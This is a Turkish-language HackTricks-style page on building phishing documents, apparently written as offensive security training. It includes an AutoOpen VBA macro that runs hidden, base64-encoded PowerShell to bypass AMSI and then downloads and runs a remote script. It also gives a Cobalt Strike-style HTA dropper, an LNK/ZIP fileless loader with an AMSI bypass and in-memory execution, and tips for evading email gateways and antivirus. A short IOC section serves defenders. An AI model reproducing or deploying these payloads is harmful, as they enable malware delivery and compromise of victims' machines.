# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word bir dosyayı açmadan önce dosya veri doğrulaması gerçekleştirir. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapı tanımlaması şeklinde yapılır. Veri yapı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.

Genellikle, makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve yine de makro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, ancak DOCM olarak yeniden adlandırılan bir dosya RTF olarak Microsoft Word tarafından işlenir ve makro çalıştırma yeteneğine sahip olur.\
Aynı içyapılar ve mekanizmalar Microsoft Office Suite (Excel, PowerPoint etc.) yazılımlarının tamamı için geçerlidir.

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları makrolar içeren ve uzak bir template'e referans veren (File –Options –Add-ins –Manage: Templates –Go) makroları da “çalıştırabilir.”

### Harici Görsel Yükleme

Git: _Insert --> Quick Parts --> Field_\
_**Kategoriler**: Links and References, **Filed names**: includePicture ve **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Belgeden makrolar kullanılarak rastgele kod çalıştırmak mümkündür.

#### Otomatik yükleme fonksiyonları

Ne kadar yaygınlarsa, AV tarafından tespit edilme olasılığı o kadar artar.

- AutoOpen()
- Document_Open()

#### Makrolar Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verileri elle kaldırma

Şuraya gidin: **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve sonra **Document Properties and Personal Information** yanında **Remove All**'a tıklayın.

#### Belge Uzantısı

İşlem tamamlandığında, **Save as type** açılır menüsünden biçimi **`.docx`**'ten **Word 97-2003 `.doc`**'a değiştirin.\
Bunu yapın çünkü **`.docx` içinde macro'ları kaydedemezsiniz** ve macro-enabled **`.docm`** uzantısı etrafında bir olumsuz algı vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, **eski `.doc` uzantısı en iyi uzlaşıdır**.

#### Kötü Amaçlı Macro Generator'ları

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

HTA, **HTML ve betik dillerini (ör. VBScript ve JScript) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelinin kısıtlamaları olmadan "tam yetkili" bir uygulama olarak çalıştırılır.

HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **yüklüdür** ve **Internet Explorer** ile birlikte gelir, bu da **`mshta`'yı IE'ye bağımlı** kılar. Yani IE kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication'ı Zorlamak

NTLM authentication'ı "remotely" **force** etmenin birkaç yolu vardır; örneğin, kullanıcı erişeceği e-postalara veya HTML'e **invisible images** ekleyebilirsiniz (hatta HTTP MitM?). Veya mağdura sadece klasörü açmak için bir **authentication** tetikleyecek dosyaların **address of files**'ını gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Unutmayın: yalnızca hash'i veya **authentication**'ı çalamakla kalmayıp, aynı zamanda **perform NTLM relay attacks** da gerçekleştirebilirsiniz:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Oldukça etkili kampanyalar, iki meşru decoy belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP teslim eder. Hile şudur: gerçek PowerShell loader, ZIP’in ham bytes'larının içinde benzersiz bir marker'dan sonra saklanır ve .lnk bunu carve edip tamamen hafızada çalıştırır.

Tipik akış, .lnk PowerShell one-liner tarafından uygulanır:

1) Orijinal ZIP'i yaygın dizinlerde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut çalışma dizininin parent'i.
2) ZIP bytes'larını okuyun ve sert kodlanmış bir marker bulun (ör. xFIQCV). Marker'dan sonraki her şey gömülü PowerShell payload'dır.
3) ZIP'i %ProgramData% içine kopyalayın, orada çıkartın ve meşru görünmek için decoy .docx'i açın.
4) Geçerli process için AMSI'yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki aşamayı deobfuscate edin (ör. tüm # karakterlerini kaldırın) ve hafızada execute edin.

Gömülü aşamayı carve edip çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Teslimat genellikle saygın PaaS alt alan adlarını (ör. *.herokuapp.com) kötüye kullanır ve payloads'a erişimi kısıtlayabilir (IP/UA'ya göre zararsız ZIPs sunarak).
- Bir sonraki aşama genellikle base64/XOR shellcode'u çözer ve disk izlerini azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.

Aynı zincirde kullanılan Persistence
- Microsoft Web Browser control üzerinde COM TypeLib hijacking uygulanarak, IE/Explorer veya kontrolü gömülü kullanan herhangi bir uygulama payload'ı otomatik olarak yeniden başlatır. Ayrıntılar ve hazır komutlar için bakınız:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII marker string (ör. xFIQCV) içeren ZIP dosyaları.
- .lnk, ZIP'yi bulmak için üst/kullanıcı klasörlerini tarar ve bir decoy document açar.
- AMSI'ye müdahale [System.Management.Automation.AmsiUtils]::amsiInitFailed ile.
- Güvenilir PaaS domain'leri altında barındırılan linklerle sonlanan uzun süre çalışan business thread'leri.

## Referanslar

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
